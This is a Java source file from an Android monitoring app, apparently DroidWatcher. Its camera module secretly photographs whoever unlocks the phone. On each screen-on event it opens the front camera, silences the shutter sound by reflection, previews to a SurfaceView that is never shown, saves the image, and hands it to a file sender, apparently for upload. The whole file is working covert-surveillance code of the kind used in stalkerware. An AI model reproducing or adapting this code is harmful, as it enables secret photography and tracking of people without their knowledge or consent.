package com.droidwatcher.modules;

import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.ref.WeakReference;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

import org.acra.ACRA;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.hardware.Camera.CameraInfo;
import android.hardware.Camera.PictureCallback;
import android.hardware.Camera.Size;
import android.os.Build;
import android.os.Handler;
import android.os.Message;
import android.support.v4.content.LocalBroadcastManager;
import android.view.SurfaceView;

import com.droidwatcher.Debug;
import com.droidwatcher.FileSender;
import com.droidwatcher.FileSender.FileType;
import com.droidwatcher.SettingsManager;
import com.droidwatcher.lib.FileUtil;
import com.droidwatcher.receivers.ScreenStateReceiver;

@SuppressLint("NewApi")
public class CameraModule implements PictureCallback {
	private static final long PHOTO_DELAY = 1 * 1000;
	private static final Locale sLocale = new Locale("ru","RU");
	
	public static final int TAKE_PHOTO = 0;
	public static final String PREFIX = "[front_camera]";

	private Context mContext;
	private SettingsManager mSettings;
	private Handler mHandler;
	private BroadcastReceiver mScreenStateReceiver;
	private Boolean mStarted;
	
	public CameraModule(Context context){
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.GINGERBREAD) {
			mContext = context;
			mSettings = new SettingsManager(context);
			
			mScreenStateReceiver = new BroadcastReceiver() {
				@Override
				public void onReceive(Context context, Intent intent) {
					int state = intent.getIntExtra(ScreenStateReceiver.SCREEN_STATE_EXTRA, ScreenStateReceiver.SCREEN_STATE_UNKNOWN);
					
					switch (state) {
					case ScreenStateReceiver.SCREEN_STATE_OFF:
						mHandler.removeMessages(TAKE_PHOTO);
						break;
					case ScreenStateReceiver.SCREEN_STATE_ON:
						if(mSettings.isFrontCameraEnabled()){
							mHandler.sendEmptyMessageDelayed(TAKE_PHOTO, PHOTO_DELAY);
						}
						break;
					default:
						break;
					}
				}
			};
			
			mHandler = new MyHandler(this);
			mStarted = true;
		}
		else{
			mStarted = false;
		}
	}
	
	public void start(){
		if (mStarted && checkFrontCamera()) {
			LocalBroadcastManager.getInstance(mContext).registerReceiver(
				mScreenStateReceiver,
				new IntentFilter(ScreenStateReceiver.SCREEN_EVENT)
			);
		}
	}
	
	public void dispose(){
		if (mStarted) {
			try {
				mHandler.removeMessages(0);
				mHandler = null;
				LocalBroadcastManager.getInstance(mContext).unregisterReceiver(mScreenStateReceiver);
				mScreenStateReceiver = null;

			} catch (Exception e) {
				Debug.exception(e);
			}
		}
	}
	
	private boolean checkFrontCamera(){
		if (Camera.getNumberOfCameras() >= 2) {
			return true;
		}
		else{
			return false;
		}
	}
	
	public static boolean checkCameraHardware(Context context) {
	    if (context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)){
	        // this device has a camera
	        return true;
	    } else {
	        // no camera on this device
	        return false;
	    }
	}
	
	private Camera getCameraInstance(int cameraID){
		Camera camera = null;
	    try {
	    	camera = Camera.open(cameraID); // attempt to get a Camera instance
	    }
	    catch (Exception e){
	        Debug.exception(e);// Camera is not available (in use or does not exist)
	    }
	    return camera; // returns null if camera is unavailable
	}
	
	private void takePhoto(){
		Camera camera = null;
		try {
			camera = getCameraInstance(CameraInfo.CAMERA_FACING_FRONT);
			if (camera == null) {
				return;
			}
			
			try {
				Camera.Parameters params = camera.getParameters();
				Size size = getOptimalSize(params.getSupportedPictureSizes());
				if (size != null) {
					params.setPictureSize(size.width, size.height);
				}
				params.setJpegQuality(60);
				camera.setParameters(params);
				
			} catch (Exception e) {
				Debug.exception(e);
			}
			
			//camera.enableShutterSound(false);
			try {
				java.lang.reflect.Method method = Camera.class.getMethod("enableShutterSound", boolean.class);
				if (method != null) {
					method.invoke(camera, false);
				}
				
			} catch (Exception e) {
				Debug.exception(e);
			}
			
			try {
				SurfaceView view = new SurfaceView(mContext);
				camera.setPreviewDisplay(view.getHolder());
				camera.startPreview();
			} catch (Exception e) {
				Debug.exception(e);
//				ACRA.getErrorReporter().handleSilentException(e);
			}
			
			camera.takePicture(null, null, this);
			
		} catch (Exception e) {
			Debug.exception(e);
			
			if (camera != null) {
				camera.release();
				camera = null;
			}
		}
	}
	
	private Size getOptimalSize(List<Size> supportedSizes){
		Size size = null;
		
		for (Size supportedSize : supportedSizes) {
			if (size == null) {
				size = supportedSize;
			}
			else{
				if (supportedSize.width < size.width && supportedSize.height < size.height) {
					size = supportedSize;
				}
			}
		}
		
		return size;
	}
	
	@Override
	public void onPictureTaken(byte[] data, Camera camera) {
		try {
			if (!FileUtil.isExternalStorageAvailable() || !FileUtil.hasExternalStorageFreeMemory()) {
				return;
			}
			
			FileOutputStream out = null;
			try {
				Date dt = new Date();
				String date = SimpleDateFormat.getDateTimeInstance(SimpleDateFormat.SHORT, SimpleDateFormat.MEDIUM, sLocale).format(dt);
				date = date.replace(':', '-');//.replace(' ', '_');
				String fName = PREFIX + "[" + date + "]" + "[" + dt.getTime() + "]" + ".jpg";
				out = new FileOutputStream(FileUtil.getExternalFullPath(mContext, fName));
				out.write(data);
			    
			    new FileSender(mContext, FileType.FRONT_CAMERA_PHOTO).start();
				    
			} catch (Exception e) {
				ACRA.getErrorReporter().handleSilentException(e);
				
			} finally {
				if (out != null) {
					try {
						out.close();
						
					} catch (IOException e) {
						Debug.exception(e);
					}
					out = null;
				}
			}
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		} finally {
			if (camera != null) {
				camera.release();
				camera = null;
			}
		}
	}
	
	private static class MyHandler extends Handler{
		private final WeakReference<CameraModule> mModule;
		
		private MyHandler(CameraModule module) {
			mModule = new WeakReference<CameraModule>(module);
	    }
		
		@Override
        public void handleMessage(Message msg) {
			CameraModule mgr = mModule.get();
	         if (mgr != null && msg.what == TAKE_PHOTO) {
	              mgr.takePhoto();
	         }
		}
	}
}
